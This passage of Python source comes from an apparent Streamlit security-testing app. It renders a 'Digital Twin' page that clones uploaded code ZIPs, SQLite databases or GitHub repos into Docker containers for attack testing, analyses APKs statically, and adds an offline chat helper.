        if ca["clone_id"] == cb["clone_id"]:
            st.warning("Both panels show the same clone — pick different ones.")

        iframe_h = st.slider("iframe height (px)", 300, 900, 500, 50,
                             key="compare_h")

        left_col, right_col = st.columns(2)
        for col, clone in ((left_col, ca), (right_col, cb)):
            with col:
                st.markdown(
                    f'<div style="font-family:JetBrains Mono,monospace;'
                    f'font-size:.72rem;color:#0284C7;margin-bottom:4px;'
                    f'background:#F0F9FF;border:1px solid #BAE6FD;'
                    f'border-radius:6px;padding:4px 10px">'
                    f'<b>{clone["clone_id"]}</b> &nbsp;·&nbsp; '
                    f'{clone["stack"] or "unknown"} &nbsp;·&nbsp; '
                    f'<a href="{clone["url"]}" target="_blank" '
                    f'style="color:#0284C7">{clone["url"]} ↗</a></div>',
                    unsafe_allow_html=True,
                )
                st.components.v1.iframe(clone["url"], height=iframe_h,
                                        scrolling=True)


def render_digital_twin_page() -> None:
    st.markdown(_CSS, unsafe_allow_html=True)
    _render_hero()
    _render_twin_assistant()
    _render_upload_section()
    # v24: Multi-clone compare removed — was rarely used and ate vertical space.
    # Each tab inside _render_upload_section renders its OWN result.


# ─────────────────────────────────────────────────────────────────────
#  TWIN ASSISTANT (Tanglish contextual helper, no LLM dep)
# ─────────────────────────────────────────────────────────────────────
def _render_twin_assistant() -> None:
    from core.twin_assistant import answer, suggested_questions
    state = st.session_state.get("dt_state", {}) or {}
    ctx = {"mode": state.get("mode", "")}
    history: list = st.session_state.setdefault("twin_chat", [])

    with st.expander("💬 Twin Assistant — ask anything (Tanglish friendly)",
                     expanded=False):
        # Show whether Ollama is detected (opt-in offline LLM enrichment)
        try:
            from core.twin_assistant import _ollama_available
            ollama_ok, ollama_model = _ollama_available()
        except Exception:
            ollama_ok, ollama_model = False, None
        if ollama_ok:
            backend_badge = (
                f'<span style="background:rgba(22,163,74,0.1);color:#16A34A;'
                f'border:1px solid rgba(22,163,74,0.25);border-radius:12px;'
                f'padding:2px 10px;font-family:JetBrains Mono,monospace;'
                f'font-size:0.62rem;font-weight:700">'
                f'● Ollama {ollama_model}</span>'
            )
        else:
            backend_badge = (
                '<span style="background:rgba(2,132,199,0.08);color:#0284C7;'
                'border:1px solid rgba(2,132,199,0.2);border-radius:12px;'
                'padding:2px 10px;font-family:JetBrains Mono,monospace;'
                'font-size:0.62rem;font-weight:700">● Local KB only</span>'
            )
        st.markdown(
            '<div style="font-family:Inter,sans-serif;font-size:0.78rem;color:#475569;'
            'margin-bottom:10px;line-height:1.55;display:flex;justify-content:space-between;align-items:center">'
            '<div>Senior-dev knowledge base (offline). '
            'Try "webshell na enna?", "is my host safe?", "how to defend SQLi?"</div>'
            f'<div>{backend_badge}</div>'
            '</div>',
            unsafe_allow_html=True,
        )
        # Quick-pick buttons
        suggestions = suggested_questions(ctx)
        sug_cols = st.columns(len(suggestions))
        for i, q in enumerate(suggestions):
            with sug_cols[i]:
                if st.button(q, key=f"asst_sug_{i}", use_container_width=True):
                    history.append({"role": "user", "text": q})
                    a = answer(q, ctx)
                    history.append({"role": "asst", "title": a["title"],
                                    "body": a["body"], "matched": a["matched"]})
                    st.rerun()

        # Free-text input
        q = st.text_input("Ask the twin", key="asst_input",
                          placeholder="Type your question…",
                          label_visibility="collapsed")
        c1, c2 = st.columns([1, 5])
        with c1:
            if st.button("Ask", key="asst_ask", type="primary",
                         use_container_width=True):
                if q and q.strip():
                    history.append({"role": "user", "text": q.strip()})
                    a = answer(q.strip(), ctx)
                    history.append({"role": "asst", "title": a["title"],
                                    "body": a["body"], "matched": a["matched"]})
                    st.rerun()
        with c2:
            if history and st.button("Clear chat", key="asst_clear",
                                     use_container_width=False):
                st.session_state["twin_chat"] = []
                st.rerun()

        # Render chat history (newest at top — easier to scan)
        if history:
            st.markdown("<div style='height:8px'></div>", unsafe_allow_html=True)
            chat_box = st.container(height=380, border=False)
            with chat_box:
                for msg in reversed(history[-12:]):
                    if msg["role"] == "user":
                        st.markdown(
                            f'<div style="background:#0284C7;color:#FFFFFF;border-radius:10px '
                            f'10px 2px 10px;padding:8px 14px;margin:6px 0 6px 20%;font-family:Inter,sans-serif;'
                            f'font-size:0.82rem;line-height:1.5">'
                            f'{msg["text"].replace("<","&lt;").replace(">","&gt;")}</div>',
                            unsafe_allow_html=True,
                        )
                    else:
                        body_html = (msg["body"]
                                     .replace("&", "&amp;")
                                     .replace("<", "&lt;").replace(">", "&gt;"))
                        # Render markdown-ish: bold for **x**, code for `x`, lists
                        body_html = re.sub(r"\*\*(.+?)\*\*", r"<b>\1</b>", body_html)
                        body_html = re.sub(r"`([^`]+)`",
                                           r'<code style="background:#F0F9FF;padding:1px 5px;border-radius:3px;color:#0C4A6E">\1</code>',
                                           body_html)
                        body_html = body_html.replace("\n", "<br>")
                        border_color = "#0284C7" if msg.get("matched") else "#64748B"
                        st.markdown(
                            f'<div style="background:#F8FBFF;border:1px solid #E0F2FE;'
                            f'border-left:3px solid {border_color};border-radius:'
                            f'10px 10px 10px 2px;padding:10px 14px;margin:6px 20% 6px 0;'
                            f'font-family:Inter,sans-serif;font-size:0.78rem;color:#0F172A;line-height:1.6">'
                            f'<div style="font-weight:700;color:#0C4A6E;margin-bottom:6px;font-size:0.85rem">'
                            f'{msg["title"]}</div>'
                            f'{body_html}</div>',
                            unsafe_allow_html=True,
                        )


# ─────────────────────────────────────────────────────────────────────
#  HERO
# ─────────────────────────────────────────────────────────────────────
def _render_hero() -> None:
    st.markdown("""
<div class="dth">
  <div style="display:flex;align-items:flex-start;gap:18px;flex-wrap:wrap">
    <div style="flex:1;min-width:280px">
      <div style="display:flex;align-items:center;gap:16px;margin-bottom:12px">
        <svg width="56" height="56" viewBox="0 0 56 56" fill="none">
          <rect x="4" y="12" width="20" height="32" rx="3"
                stroke="rgba(255,255,255,.9)" stroke-width="1.6"
                fill="rgba(255,255,255,.1)"/>
          <rect x="32" y="12" width="20" height="32" rx="3"
                stroke="rgba(255,255,255,.9)" stroke-width="1.6"
                fill="rgba(255,255,255,.1)" stroke-dasharray="3 2"/>
          <line x1="8" y1="20" x2="20" y2="20" stroke="rgba(255,255,255,.65)" stroke-width="1.3"/>
          <line x1="8" y1="26" x2="17" y2="26" stroke="rgba(255,255,255,.4)" stroke-width="1.3"/>
          <line x1="8" y1="32" x2="20" y2="32" stroke="rgba(255,255,255,.65)" stroke-width="1.3"/>
          <line x1="8" y1="38" x2="15" y2="38" stroke="rgba(255,255,255,.4)" stroke-width="1.3"/>
          <line x1="36" y1="20" x2="48" y2="20" stroke="rgba(255,255,255,.65)" stroke-width="1.3"/>
          <line x1="36" y1="26" x2="45" y2="26" stroke="rgba(255,255,255,.4)" stroke-width="1.3"/>
          <line x1="36" y1="32" x2="48" y2="32" stroke="rgba(255,255,255,.65)" stroke-width="1.3"/>
          <line x1="36" y1="38" x2="43" y2="38" stroke="rgba(255,255,255,.4)" stroke-width="1.3"/>
          <line x1="24" y1="28" x2="31" y2="28" stroke="#10B981" stroke-width="2.4"
                stroke-linecap="round">
            <animate attributeName="opacity" values=".3;1;.3" dur="1.6s" repeatCount="indefinite"/>
          </line>
          <polygon points="31,25 31,31 34,28" fill="#10B981">
            <animate attributeName="opacity" values=".3;1;.3" dur="1.6s" repeatCount="indefinite"/>
          </polygon>
          <circle cx="49" cy="15" r="3.5" fill="#F87171">
            <animate attributeName="opacity" values=".3;1;.3" dur="1.3s" repeatCount="indefinite"/>
          </circle>
        </svg>
        <div>
          <div class="dth-title">Digital Twin · Clone &amp; Attack</div>
          <div class="dth-sub">
            Upload any ZIP → <b>Docker live clone</b> + <b>VS Code workbench</b>
            launch together. Edit code → save → container reflects instantly.
            Attack the replica. Original untouched.
          </div>
        </div>
      </div>
      <div class="dth-chips">
        <span class="dth-chip"><span class="dot"></span>DOCKER SANDBOX</span>
        <span class="dth-chip"><span class="dot"></span>LIVE WORKBENCH</span>
        <span class="dth-chip"><span class="dot"></span>4 ATTACK MODES</span>
        <span class="dth-chip"><span class="dot"></span>EICAR INJECTION</span>
        <span class="dth-chip"><span class="dot"></span>FORENSIC PDF</span>
      </div>
    </div>
  </div>
</div>""", unsafe_allow_html=True)


# ─────────────────────────────────────────────────────────────────────
#  UPLOAD SECTION
# ─────────────────────────────────────────────────────────────────────
# ─────────────────────────────────────────────────────────────────────
#  PROFESSIONAL SVG ICONS — for section headers
# ─────────────────────────────────────────────────────────────────────
_SECTION_ICONS = {
    "workbench": '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/><polyline points="8,9 11,12 8,15"/><line x1="13" y1="15" x2="16" y2="15"/></svg>',
    "docker":    '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="3" height="3"/><rect x="7" y="11" width="3" height="3"/><rect x="11" y="11" width="3" height="3"/><rect x="7" y="7" width="3" height="3"/><rect x="11" y="7" width="3" height="3"/><rect x="11" y="3" width="3" height="3"/><path d="M16 11h5c0 4.5-3 8-9 8s-7-3-7-7"/></svg>',
    "preview":   '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>',
    "attack":    '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>',
    "ml":        '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="3"/><circle cx="12" cy="3" r="1"/><circle cx="12" cy="21" r="1"/><circle cx="3" cy="12" r="1"/><circle cx="21" cy="12" r="1"/><circle cx="5.5" cy="5.5" r="1"/><circle cx="18.5" cy="18.5" r="1"/><circle cx="5.5" cy="18.5" r="1"/><circle cx="18.5" cy="5.5" r="1"/><line x1="12" y1="9" x2="12" y2="4"/><line x1="12" y1="20" x2="12" y2="15"/><line x1="9" y1="12" x2="4" y2="12"/><line x1="20" y1="12" x2="15" y2="12"/></svg>',
    "deep":      '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/><line x1="11" y1="8" x2="11" y2="14"/><line x1="8" y1="11" x2="14" y2="11"/></svg>',
    "download":  '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7,10 12,15 17,10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>',
    "destroy":   '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="3,6 5,6 21,6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/></svg>',
    "xss":       '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="16,18 22,12 16,6"/><polyline points="8,6 2,12 8,18"/></svg>',
    "sql":       '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><ellipse cx="12" cy="5" rx="9" ry="3"/><path d="M21 12c0 1.66-4 3-9 3s-9-1.34-9-3"/><path d="M3 5v14c0 1.66 4 3 9 3s9-1.34 9-3V5"/></svg>',
    "backdoor":  '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 8h1a4 4 0 0 1 0 8h-1"/><path d="M2 8h16v9a4 4 0 0 1-4 4H6a4 4 0 0 1-4-4V8z"/><line x1="6" y1="1" x2="6" y2="4"/><line x1="10" y1="1" x2="10" y2="4"/><line x1="14" y1="1" x2="14" y2="4"/></svg>',
    "eicar":     '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 11.5a8.38 8.38 0 0 1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.38 8.38 0 0 1-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 0 1-.9-3.8 8.5 8.5 0 0 1 4.7-7.6 8.38 8.38 0 0 1 3.8-.9h.5a8.48 8.48 0 0 1 8 8v.5z"/></svg>',
}

def _sec_header(icon_key: str, title: str, badge_html: str = "") -> str:
    """Render an attractive section header with SVG icon."""
    ico = _SECTION_ICONS.get(icon_key, _SECTION_ICONS["workbench"])
    badge = f'<div style="margin-left:auto">{badge_html}</div>' if badge_html else ""
    return (
        f'<div class="dt-sec">'
        f'<span class="dt-sec-ico">{ico}</span>'
        f'<span class="dt-sec-txt">{title}</span>'
        f'{badge}'
        f'</div>'
    )


def _file_card(name: str, kind: str, icon: str, size_kb: float) -> None:
    st.markdown(
        f"""<div style="background:linear-gradient(135deg,#F0F9FF,#E0F2FE);border:1px solid #BAE6FD;border-radius:12px;padding:16px 20px;margin:12px 0;
display:flex;justify-content:space-between;align-items:center;box-shadow:0 2px 8px rgba(2,132,199,0.08);animation:dt-fadein 0.5s ease-out;">
  <div style="display:flex;align-items:center;gap:14px;">
    <div style="width:42px;height:42px;background:linear-gradient(135deg,#0284C7,#0369A1);border-radius:10px;display:flex;align-items:center;justify-content:center;color:#fff;font-size:1.2rem;flex-shrink:0;">{icon}</div>
    <div>
      <div style="font-family:Inter,sans-serif;font-size:0.92rem;color:#0C4A6E;font-weight:700;">{name}</div>
      <div style="font-family:JetBrains Mono,monospace;font-size:0.7rem;color:#0284C7;margin-top:3px;">{size_kb:.1f} KB · {kind}</div>
    </div>
  </div>
  <span style="background:#FFFFFF;color:#0284C7;padding:6px 14px;border-radius:20px;border:1px solid #BAE6FD;
font-family:JetBrains Mono,monospace;font-size:0.65rem;font-weight:700;letter-spacing:0.08em;
animation:dt-pulse 1.8s ease-in-out infinite;">● READY</span>
</div>""",
        unsafe_allow_html=True,
    )


def _render_upload_section() -> None:
    tab_code, tab_db, tab_apk = st.tabs([
        "📦  Code Clone (ZIP)",
        "🗄️  Database Twin",
        "📱  APK Analysis",
    ])

    state = st.session_state.get("dt_state", {}) or {}

    # ── Tab 1: ZIP code clone ─────────────────────────────────────
    with tab_code:
        st.markdown(
            f'<div style="font-family:{SANS};font-size:.84rem;color:{TXM};line-height:1.6;margin-bottom:10px;">'
            'Upload a web-app / script ZIP → real <b>Docker clone</b> that runs live on localhost + a <b>VS Code workbench</b>.<br>'
            '<span style="font-size:.78rem;color:#64748B">'
            '<b>Runs live:</b> PHP · Python (Flask · FastAPI · Streamlit · Django · Gradio) · '
            'Node · Java (Maven · Gradle) · Go · Ruby (Sinatra · Rack) · static HTML. '
            '<b>For SQL/DB files:</b> use the Database Twin tab instead.</span></div>',
            unsafe_allow_html=True,
        )
        up = st.file_uploader("Drop ZIP here", type=["zip"], key="dt_up_zip",
                              label_visibility="collapsed")
        if up is not None:
            _file_card(up.name, "ZIP archive", "📦", len(up.getvalue()) / 1024)
            c1, c2 = st.columns([1.2, 3])
            with c1:
                go = st.button("🚀 Clone & Deploy", type="primary",
                               use_container_width=True, key="dt_btn_zip")
            with c2:
                st.markdown(f'<div style="padding-top:9px;font-family:Inter;font-size:0.78rem;color:#64748B;">'
                            '⚡ Auto-detects stack → runs the real app live</div>', unsafe_allow_html=True)
            if go:
                if state.get("filename") != up.name or state.get("mode") != "code":
                    _init_twin(up)
                    return

        # ── Local path shortcut — skips browser upload entirely (instant) ──
        st.markdown(
            '<div style="text-align:center;color:#94A3B8;font-size:0.72rem;'
            'margin:6px 0 4px">─── or paste a local file path (no upload needed) ───</div>',
            unsafe_allow_html=True,
        )
        local_col, btn_col = st.columns([4, 1])
        with local_col:
            local_path = st.text_input(
                "Local ZIP path", placeholder=r"C:\Users\you\project.zip",
                key="dt_local_zip", label_visibility="collapsed",
            )
        with btn_col:
            go_local = st.button("⚡ Deploy", key="dt_btn_local_zip",
                                 use_container_width=True)
        if go_local and local_path:
            lp = local_path.strip().strip('"').strip("'")
            if not os.path.isfile(lp):
                st.error(f"File not found: `{lp}`")
            elif not lp.lower().endswith(".zip"):
                st.error("Must be a .zip file")
            else:
                sz = os.path.getsize(lp) / 1024 / 1024
                _file_card(os.path.basename(lp), "Local ZIP (no upload)", "⚡", sz * 1024)
                _init_twin_from_path(lp)
                return

        # ── GitHub URL shortcut ───────────────────────────────────────
        st.markdown(
            '<div style="text-align:center;color:#94A3B8;font-size:0.72rem;'
            'margin:6px 0 4px">─── or deploy directly from a GitHub repo ───</div>',
            unsafe_allow_html=True,
        )
        gh_col, gh_btn_col = st.columns([4, 1])
        with gh_col:
            gh_url_input = st.text_input(
                "GitHub URL", placeholder="https://github.com/owner/repo",
                key="dt_github_url", label_visibility="collapsed",
            )
        with gh_btn_col:
            go_github = st.button("🐙 Deploy", key="dt_btn_github", use_container_width=True)
        if go_github and gh_url_input:
            url_clean = gh_url_input.strip()
            if "github.com" not in url_clean:
                st.error("Must be a github.com URL")
            else:
                _init_twin_from_github(url_clean)
                return

        # ── (v24 removed: built-in vulnerable demo — not needed in production) ──

        # Render the code-clone result INSIDE this tab so it never leaks across.
        if state.get("mode") == "code":
            _render_code_clone_panel(state)

    # ── Tab 2: Database twin ──────────────────────────────────────
    with tab_db:
        st.markdown(
            f'<div style="font-family:{SANS};font-size:.84rem;color:{TXM};line-height:1.6;margin-bottom:10px;">'
            'Upload a <b>.db / .sqlite</b> → live <b>sqlite-web</b> container: browse tables &amp; run SQL '
            'in the browser, plus an automatic security scan and <b>real SQL/XSS attack lab</b> against the live twin.</div>',
            unsafe_allow_html=True,
        )
        up = st.file_uploader("Drop database here", type=["db", "sqlite", "sqlite3"],
                              key="dt_up_db", label_visibility="collapsed")
        if up is not None:
            _file_card(up.name, "SQLite database", "🗄️", len(up.getvalue()) / 1024)
            c1, c2 = st.columns([1.2, 3])
            with c1:
                go = st.button("🚀 Deploy Database Twin", type="primary",
                               use_container_width=True, key="dt_btn_db")
            with c2:
                st.markdown(f'<div style="padding-top:9px;font-family:Inter;font-size:0.78rem;color:#64748B;">'
                            '🗄️ Real browsable DB UI · live SQL console · attack lab</div>', unsafe_allow_html=True)
            if go:
                if state.get("filename") != up.name or state.get("mode") != "database":
                    _init_db_twin(up)
                    return
        st.markdown(
            '<div style="text-align:center;color:#94A3B8;font-size:0.72rem;margin:6px 0 4px">'
            '─── or paste a local file path ───</div>', unsafe_allow_html=True)
        db_lc, db_bc = st.columns([4, 1])
        with db_lc:
            db_local = st.text_input("Local DB path", placeholder=r"C:\Users\you\database.db",
                                     key="dt_local_db", label_visibility="collapsed")
        with db_bc:
            go_db_local = st.button("⚡ Deploy", key="dt_btn_local_db", use_container_width=True)
        if go_db_local and db_local:
            lp = db_local.strip().strip('"').strip("'")
            if not os.path.isfile(lp):
                st.error(f"File not found: `{lp}`")
            else:
                import io
                with open(lp, "rb") as fh:
                    data = fh.read()
                class _FakeBuf:
                    name = os.path.basename(lp)
                    def getvalue(self): return data
                _init_db_twin(_FakeBuf())
                return
        # ── (v24 removed: built-in vulnerable demo DB) ──

        # Render db twin INSIDE this tab
        if state.get("mode") == "database":
            _render_db_twin_view(state)

    # ── Tab 3: APK twin ───────────────────────────────────────────
    with tab_apk:
        st.markdown(
            f'<div style="font-family:{SANS};font-size:.84rem;color:{TXM};line-height:1.6;margin-bottom:10px;">'
            'Upload an <b>.apk</b> → real static <b>APK Twin</b>: replica of permissions, components, '
            'embedded secrets, malware permission-combos, and a risk verdict. '
            '<i>An APK is an Android binary — it can\'t run in a web preview — so the attack surface '
            'is exposed as a forensic report instead of a live URL.</i></div>',
            unsafe_allow_html=True,
        )
        up = st.file_uploader("Drop APK here", type=["apk"], key="dt_up_apk",
                              label_visibility="collapsed")
        if up is not None:
            _file_card(up.name, "Android APK", "📱", len(up.getvalue()) / 1024)
            c1, c2 = st.columns([1.2, 3])
            with c1:
                go = st.button("🔬 Build APK Twin", type="primary",
                               use_container_width=True, key="dt_btn_apk")
            with c2:
                st.markdown(f'<div style="padding-top:9px;font-family:Inter;font-size:0.78rem;color:#64748B;">'
                            '🔬 Permissions · malware combos · secrets · verdict</div>', unsafe_allow_html=True)
            if go:
                if state.get("filename") != up.name or state.get("mode") != "apk":
                    _init_apk_analysis(up)
                    return
        st.markdown(
            '<div style="text-align:center;color:#94A3B8;font-size:0.72rem;margin:6px 0 4px">'
            '─── or paste a local file path ───</div>', unsafe_allow_html=True)
        apk_lc, apk_bc = st.columns([4, 1])
        with apk_lc:
            apk_local = st.text_input("Local APK path", placeholder=r"C:\Users\you\app.apk",
                                      key="dt_local_apk", label_visibility="collapsed")
        with apk_bc:
            go_apk_local = st.button("⚡ Analyze", key="dt_btn_local_apk", use_container_width=True)
        if go_apk_local and apk_local:
            lp = apk_local.strip().strip('"').strip("'")
            if not os.path.isfile(lp):
                st.error(f"File not found: `{lp}`")
            else:
                with open(lp, "rb") as fh:
                    data = fh.read()
                class _FakeApk:
                    name = os.path.basename(lp)
                    def getvalue(self): return data
                _init_apk_analysis(_FakeApk())
                return
        # Render apk INSIDE this tab
        if state.get("mode") == "apk":
            _render_apk_view(state)


def _init_twin_from_github(gh_url: str) -> None:
    """Start a GitHub-URL deploy. Kicks off clone_from_github_streaming in a background thread."""
    from core.source_clone import clone_from_github_streaming
    job_id = "job_" + secrets.token_hex(6)
    repo_name = gh_url.rstrip("/").split("/")[-1].removesuffix(".git") or "github_repo"

    def _gh_worker(jid: str, url: str) -> None:
        try:
            for evt in clone_from_github_streaming(url):
                _JOBS[jid] = evt
                if evt.get("stage") == "error":
                    _JOBS[jid]["error"] = evt.get("error", "Unknown error")
                    return
                if evt.get("stage") == "ready" and evt.get("result"):
                    _JOBS[jid]["stage"] = "ready"
                    return
        except Exception as exc:
            _JOBS[jid] = {"stage": "error", "pct": 0, "msg": str(exc), "error": str(exc)}

    _JOBS[job_id] = {"stage": "preflight", "pct": 2, "msg": "Connecting to GitHub…"}
    t = threading.Thread(target=_gh_worker, args=(job_id, gh_url), daemon=True)
    t.start()

    st.session_state["dt_state"] = {
        "job_id": job_id, "filename": repo_name + ".zip",
        "zip_path": "", "extract_dir": "", "files": [], "scan": {},
        "selected": "", "edit_mode": False, "clone_result": None,
        "attack_log": [], "eicar_state": None, "mode": "code",
        "deploy_start": time.time(),
        "github_url": gh_url,
    }
    st.rerun()


def _init_twin_from_path(zip_path: str) -> None:
    """Deploy from a local disk path — bypasses browser upload (instant)."""
    import os as _os
    name = _os.path.basename(zip_path)
    job_id = "job_" + secrets.token_hex(6)
    extract_dir = _os.path.join(
        tempfile.gettempdir(), "aidtctm_wb",
        hashlib.md5(zip_path.encode()).hexdigest()[:10],
    )
    _os.makedirs(extract_dir, exist_ok=True)
    files = _extract_zip(zip_path, extract_dir)
    _JOBS[job_id] = {"stage": "extracting", "pct": 2, "msg": "Initialising…"}
    t = threading.Thread(target=_clone_worker, args=(job_id, zip_path), daemon=True)
    t.start()
    scan = _run_initial_scan(files, extract_dir)
    viewable = [f for f in files if f["ext"] in _CODE_EXTS]
    st.session_state["dt_state"] = {
        "job_id": job_id, "filename": name, "zip_path": zip_path,
        "extract_dir": extract_dir, "files": files, "scan": scan,
        "selected": viewable[0]["rel"] if viewable else "",
        "edit_mode": False, "clone_result": None,
        "attack_log": [], "eicar_state": None, "mode": "code",
        "deploy_start": time.time(),
    }
    st.rerun()


def _init_twin(uploaded: Any) -> None:
    """Save ZIP, extract for workbench, kick off background Docker clone."""
    job_id = "job_" + secrets.token_hex(6)

    # Persist ZIP to disk
    tmp = tempfile.NamedTemporaryFile(delete=False, suffix=".zip")
    tmp.write(uploaded.getvalue())
    tmp.close()

    # Extract locally for immediate workbench
    extract_dir = os.path.join(
        tempfile.gettempdir(), "aidtctm_wb",
        hashlib.md5(uploaded.name.encode()).hexdigest()[:10],
    )
    os.makedirs(extract_dir, exist_ok=True)
    files = _extract_zip(tmp.name, extract_dir)

    # Run forensic + deep scan in background (so workbench loads immediately)
    _JOBS[job_id] = {"stage": "extracting", "pct": 2, "msg": "Initialising…"}

    # Launch Docker clone thread
    t = threading.Thread(target=_clone_worker, args=(job_id, tmp.name), daemon=True)
    t.start()

    # Run initial scan (quick — non-blocking in practice for small zips)
    scan = _run_initial_scan(files, extract_dir)

    viewable = [f for f in files if f["ext"] in _CODE_EXTS]

    st.session_state["dt_state"] = {
        "job_id":       job_id,
        "filename":     uploaded.name,
        "zip_path":     tmp.name,
        "extract_dir":  extract_dir,
        "files":        files,         # local extracted
        "scan":         scan,
        "selected":     viewable[0]["rel"] if viewable else "",
        "edit_mode":    False,
        "clone_result": None,
        "attack_log":   [],
        "eicar_state":  None,         # result of inject_eicar_into_clone
        "mode":         "code",       # code clone (vs database twin)
        "deploy_start": time.time(),
    }
    st.rerun()


# ─────────────────────────────────────────────────────────────────────
#  DATABASE TWIN  (SQLite → live sqlite-web container)
# ─────────────────────────────────────────────────────────────────────
def _db_twin_worker(job_id: str, db_path: str) -> None:
    """Background thread: build + run the SQLite web container."""
    def upd(stage: str, pct: int, msg: str, **kw) -> None:
        _JOBS[job_id].update({"stage": stage, "pct": pct, "msg": msg, **kw})

    try:
        from core.database_twin import deploy_sqlite_twin_streaming
    except ImportError as e:
        _JOBS[job_id]["error"] = f"Import failed: {e}"
        upd("error", 100, f"Import failed: {e}")
        return

    _stage_map = {
        "extract":    (12, "Staging database…"),
        "detect":     (26, "Reading schema…"),
        "dockerfile": (40, "Generating Dockerfile…"),
        "build":      (70, "Building sqlite-web image…"),
        "run":        (88, "Launching container…"),
        "ready":      (96, "HTTP health-check…"),
    }
    result = None
    try:
        for ev in deploy_sqlite_twin_streaming(db_path):
            et = ev.get("type", "")
            if et == "stage":
                s = ev.get("stage", "")
                pct, msg = _stage_map.get(s, (50, ev.get("message", s)))
                upd(s, pct, ev.get("message", msg))
            elif et == "build_log":
                lg = _JOBS[job_id].get("build_log", [])
                lg.append(ev["line"])
                _JOBS[job_id]["build_log"] = lg[-60:]
            elif et == "error":
                _JOBS[job_id]["error"] = ev.get("error", "Unknown error")
                upd("error", 100, ev.get("error", ""))
                return
            elif et == "complete":
                result = ev["result"]
        if result:
            upd("ready", 100, f"Deployed at {result.get('url','?')}")
            _JOBS[job_id]["result"] = result
        else:
            _JOBS[job_id]["error"] = "Deploy returned no result"
            upd("error", 100, "Deploy returned no result")
    except Exception as exc:
        _JOBS[job_id]["error"] = str(exc)
        upd("error", 100, str(exc))


def _init_db_twin(uploaded: Any) -> None:
    """Stage the DB file and kick off the background database-twin deploy."""
    job_id = "job_" + secrets.token_hex(6)

    suffix = "." + (uploaded.name.rsplit(".", 1)[-1].lower() if "." in uploaded.name else "db")
    tmp = tempfile.NamedTemporaryFile(delete=False, suffix=suffix)
    tmp.write(uploaded.getvalue())
    tmp.close()

    # Quick local schema read for the explorer (instant, before container ready)
    try:
        from core.database_twin import get_sqlite_schema
        schema = get_sqlite_schema(tmp.name)
    except Exception:
        schema = []

    _JOBS[job_id] = {"stage": "extracting", "pct": 2, "msg": "Initialising…"}
    t = threading.Thread(target=_db_twin_worker, args=(job_id, tmp.name), daemon=True)
    t.start()

    st.session_state["dt_state"] = {
        "job_id":       job_id,
        "filename":     uploaded.name,
        "db_path":      tmp.name,
        "schema":       schema,
        "clone_result": None,
        "mode":         "database",
    }
    st.rerun()


# ─────────────────────────────────────────────────────────────────────
#  APK ANALYSIS  (static forensic report — no live run)
# ─────────────────────────────────────────────────────────────────────
def _init_apk_analysis(uploaded: Any) -> None:
    """
    Save the APK, run the static analyzer AND build the APK Source Workbench
    (decoded manifest + per-file viewers + attack surface). All real, all fast.
    """
    tmp = tempfile.NamedTemporaryFile(delete=False, suffix=".apk")
    tmp.write(uploaded.getvalue())
    tmp.close()

    report = {"status": "error", "error": "analysis failed"}
    workbench = None
    with st.status(f"🔬 Building APK Twin for {uploaded.name}…",
                   expanded=True) as status:
        try:
            from core.apk_analyzer import analyze_apk
            from core.apk_workbench import build_apk_workbench
            st.write("Unpacking APK + decoding AndroidManifest…")
            workbench = build_apk_workbench(tmp.name)
            if "error" in (workbench or {}):
                status.update(label=f"⚠ workbench failed: {workbench['error']}",
                              state="error")
                workbench = None
            else:
                s = workbench["stats"]
                st.write(f"✓ {s['file_count']} files · {s['dex_count']} dex · "
                         f"{s['native_count']} native libs · "
                         f"{s['total_size']/1024/1024:.1f} MB unpacked")
            st.write("Permission audit + malware-pattern scan…")
            report = analyze_apk(tmp.name)
            if report.get("status") == "complete":
                md = report.get("metadata", {})
                st.write(f"✓ {len(report.get('all_permissions',[]))} permissions, "
                         f"{len(report.get('permission_combos',[]))} malware combo(s)")
                status.update(label=f"✓ {uploaded.name} — verdict: {report.get('severity','?')}",
                              state="complete", expanded=False)
            else:
                status.update(label=f"⚠ {report.get('error','analysis error')}",
                              state="error")
        except Exception as e:
            import traceback; traceback.print_exc()
            report = {"status": "error", "error": str(e)}
            status.update(label=f"⚠ APK twin build failed: {e}", state="error")

    st.session_state["dt_state"] = {
        "job_id":    "apk_" + secrets.token_hex(4),
        "filename":  uploaded.name,
